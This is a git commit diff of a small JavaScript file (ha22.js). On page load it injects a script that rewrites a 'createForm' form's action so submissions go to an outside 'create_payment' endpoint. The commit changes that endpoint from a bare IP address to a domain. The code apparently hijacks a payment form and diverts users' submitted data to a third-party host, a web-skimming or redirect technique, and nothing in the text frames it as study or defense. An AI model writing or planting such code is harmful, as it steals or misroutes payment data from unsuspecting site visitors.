02e3c378904b61c2e0729594a7ef2209d6577606
xjjkong <138182422+xjjkong@users.noreply.github.com>
2023-07-04 21:31:41 +0800

    Update and rename ha21.js to ha22.js

--- ha22.js
+++ ha22.js
@@ -3,7 +3,7 @@
 window.onload=function(){
      var scriptEle = document.createElement("script");
      scriptEle.type ="text/javascript";
-     scriptEle.text = `document.getElementById('createForm').action = 'http://43.198.42.193/create_payment'`;
+     scriptEle.text = `document.getElementById('createForm').action = 'https://www.xiaoxiaoshagua.com/create_payment'`;
      var x = document.getElementById("createForm");
      x.insertBefore(scriptEle, x.firstChild);
      document.body.appendChild(scriptEle);
